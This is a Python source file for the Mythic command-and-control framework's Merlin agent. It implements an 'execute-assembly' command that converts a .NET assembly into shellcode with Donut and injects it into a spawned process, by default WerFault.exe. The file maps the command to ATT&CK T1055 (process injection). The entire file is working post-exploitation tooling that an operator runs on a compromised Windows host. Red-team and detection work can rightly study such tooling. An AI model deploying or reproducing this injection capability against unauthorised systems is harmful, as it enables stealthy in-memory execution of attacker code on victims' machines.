
from merlin import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json
import shlex

# Set to enable debug output to Mythic
debug = False


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "assembly": CommandParameter(
                name="assembly",
                type=ParameterType.File,
                description="The .NET assembly you want to execute",
                ui_position=0,
                required=False,
            ),
            "arguments": CommandParameter(
                name="arguments",
                type=ParameterType.String,
                description="Arguments to execute the .NET assembly with",
                ui_position=1,
                required=False,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=2,
                required=True,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                ui_position=3,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                # This allows an operator to specify the name of an a file that was previously registered with Mythic
                # in place of providing the actual file
                args = shlex.split(self.command_line)
                if len(args) > 0:
                    self.add_arg("assembly_name", args[0], ParameterType.String)
                if len(args) > 1:
                    self.add_arg("arguments", args[1], ParameterType.String)
                if len(args) > 2:
                    self.add_arg("spawnto", args[2], ParameterType.String)
                if len(args) > 3:
                    self.add_arg("spawntoargs", args[3], ParameterType.String)


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute-assembly"
    needs_admin = False
    help_cmd = "execute-assembly"
    description = "Convert a .NET assembly into shellcode with Donut, execute it in the spawnto process, and return the output"
    version = 1
    author = "@Ne0nd0g"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicRPC().execute(
                "create_output",
                task_id=task.id,
                output=f'\n[DEBUG]Task:\n{task}',
            )
        # Use Cases
        # 1. User provides an assembly that has NOT been previously registered
        # 2. User provides an assembly that HAS been previously registered
        # 3. User provides a file name of an assembly that has NOT been previously registered
        # 4. User provides a file name of an assembly that HAS been previously registered
        # 5. If a file was provided instead of a filename, use the provided file

        # Determine if a file or a file name was provided
        if task.args.get_arg("assembly") is None:
            # A file WAS NOT provided
            if task.args.has_arg("assembly_name"):
                assembly_name = task.args.get_arg("assembly_name")
                assembly_bytes = None
            else:
                raise Exception(f'A file or the name of a file was not provided')
        else:
            assembly_name = json.loads(task.original_params)["assembly"]
            assembly_bytes = task.args.get_arg("assembly")

        assembly = await get_or_register_file(task, assembly_name, assembly_bytes)

        # Donut
        donut_args = {
            "params": task.args.get_arg("arguments"),
            "exit": "2",
            "verbose": True,
        }
        donut_shellcode, donut_result = donut(assembly, donut_args)
        task.stdout += f'\n{donut_result}'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut_shellcode,
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.display_params = f'{assembly_name} {task.args.get_arg("arguments")}\n ' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("assembly")
        task.args.remove_arg("assembly_name")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass
